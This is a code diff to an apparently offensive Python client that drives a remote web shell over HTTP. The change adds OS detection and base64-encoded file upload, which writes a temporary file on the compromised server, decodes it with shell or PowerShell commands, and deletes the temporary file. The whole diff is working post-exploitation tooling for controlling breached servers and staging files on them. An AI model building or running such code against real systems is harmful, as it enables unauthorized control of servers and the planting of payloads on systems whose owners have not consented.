@@ -3,6 +3,7 @@ import sys, os
 import requests
 import readline
 import argparse
+import base64
 from termcolor import colored
 
 def send_command(command, webshell, method, param="code"):
@@ -48,9 +49,10 @@ try:
     cwd = "" ; slash = '\\'
     if not slash in whoami:
        path = send_command('pwd', WEBSHELL, HTTP_METHOD, PARAM)
-       slash = '/'
+       system = "linux" ; slash = '/'
     else:
        path = send_command('(pwd).path', WEBSHELL, HTTP_METHOD, PARAM)
+       system = "windows"
 
     while True:
        try:
@@ -72,14 +74,22 @@ try:
              if "upload" in command.split()[0]: 
                 localfile = command.split()[1]
                 remotefile = command.split()[2]
+                remotefiletmp = remotefile.rstrip() + ".tmp"
                 if not slash in remotefile:
-                   remotefile = path.rstrip() + slash + command.split()[2] 
+                   remotefile = path.rstrip() + slash + command.split()[2]
+                if not slash in remotefiletmp:
+                   remotefiletmp = path.rstrip() + slash + command.split()[2] + ".tmp"
                 if not slash in localfile:
                    cwd = os.getcwd()
                 print (colored("Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "r")
-                rawfiledata = f.read()
-                upload = send_command("echo " + rawfiledata.rstrip() + (' > ') + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata.encode("utf-8"))
+                send_command("echo " + str(base64data.rstrip(), "utf-8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                if system == "linux":
+                   send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                if system == "windows":
+                   send_command("$base64 = cat -raw " + remotefiletmp + " ; [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($base64)) > " +
+                   remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
              else:
                 if "download" in command.split()[0]: 
                    remotefile = command.split()[1]
